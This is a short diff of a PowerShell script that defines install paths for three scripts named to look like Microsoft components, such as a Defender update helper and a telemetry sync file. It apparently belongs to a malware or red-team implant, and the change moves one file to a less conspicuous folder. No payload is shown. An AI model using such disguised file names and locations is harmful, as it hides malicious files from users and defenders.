@@ -5,7 +5,7 @@ function Gen-Info {
     $username = "$($username.Split('\')[1])"
 
     # Paths
-    $alfa_path = "C:\ProgramData\Microsoft\Windows Defender\DefenderUpdateHelper.ps1"
+    $alfa_path = "C:\ProgramData\Microsoft\Diagnosis\DefenderUpdateHelper.ps1"
     $bravo_path = "C:\ProgramData\Microsoft\Windows\WER\WERReportManager.ps1"
     $charlie_path = "C:\Users\$username\AppData\Roaming\Microsoft\MicrosoftTelemetrySync.ps1"
     
